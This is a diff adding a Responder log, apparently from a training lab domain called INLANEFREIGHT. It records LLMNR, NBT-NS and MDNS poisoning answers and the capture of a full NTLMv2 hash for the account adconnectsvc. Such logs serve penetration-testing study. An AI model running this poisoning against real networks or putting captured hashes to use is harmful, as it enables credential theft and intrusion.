@@ -1,0 +1,32 @@
+02/06/2025 02:29:12 PM - Responder Started: ['./Responder.py', '-I', 'ens35']
+02/06/2025 02:29:17 PM - [*] [NBT-NS] Poisoned answer sent to 172.16.130.1 for name WORKGROUP (service: Domain Master Browser)
+02/06/2025 02:29:20 PM - [*] [NBT-NS] Poisoned answer sent to 172.16.130.1 for name WORKGROUP (service: Browser Election)
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.130.1    for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad.local
+02/06/2025 02:29:22 PM - [*] [LLMNR]  Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad
+02/06/2025 02:29:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.130.1 for name wpad
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.130.1    for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.130.1    for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.130.1    for name wpad.local
+02/06/2025 02:29:22 PM - [*] [MDNS] Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad.local
+02/06/2025 02:29:22 PM - [*] [LLMNR]  Poisoned answer sent to fe80::4c1:a0a3:43ef:af16 for name wpad
+02/06/2025 02:29:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.130.1 for name wpad
+02/06/2025 02:29:22 PM - [HTTP] User-Agent        : WinHttp-Autoproxy-Service/5.1
+02/06/2025 02:29:22 PM - [HTTP] User-Agent        : WinHttp-Autoproxy-Service/5.1
+02/06/2025 02:29:41 PM - [SMB] NTLMv2-SSP Client   : 172.16.130.20
+02/06/2025 02:29:41 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [SMB] NTLMv2-SSP Hash     : adconnectsvc::INLANEFREIGHT:961b8bcb2559688c:86F4650AAC9B99AA852171600B2AF789:010100000000000000EC9C7DA378DB01ED3CBEC9995FD4F10000000002000800520047003500450001001E00570049004E002D00520056004F005200410033004E00360055003600490004003400570049004E002D00520056004F005200410033004E0036005500360049002E0052004700350045002E004C004F00430041004C000300140052004700350045002E004C004F00430041004C000500140052004700350045002E004C004F00430041004C000700080000EC9C7DA378DB01060004000200000008003000300000000000000001000000002000000B67DF691E70E871D8563B1A17C1C894D756C55595DB9FF5B54601E9CC8D70400A001000000000000000000000000000000000000900260063006900660073002F003100370032002E00310036002E003100330030002E00310033003000000000000000000000000000
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
+02/06/2025 02:29:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\adconnectsvc
